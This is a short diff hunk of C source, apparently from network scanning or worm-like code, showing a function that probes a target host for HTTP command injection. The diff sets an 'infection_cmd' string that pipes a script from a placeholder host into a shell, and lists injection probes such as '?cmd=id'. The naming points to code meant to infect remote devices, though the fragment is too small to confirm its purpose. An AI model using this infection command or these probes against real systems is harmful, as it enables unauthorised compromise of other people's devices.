@@ -205,7 +205,7 @@ static int http_check_auth(int fd, const char *user, const char *pass)
 }
 static int http_check_command_injection(int fd, ipv4_t target_ip, uint16_t port)
 {
-    const char *infection_cmd = "curl -s https:
+    const char *infection_cmd = "curl -s https://example.com/payload.sh | sh";
     const char *payloads[] = {
         "?cmd=id",
         "?exec=id",
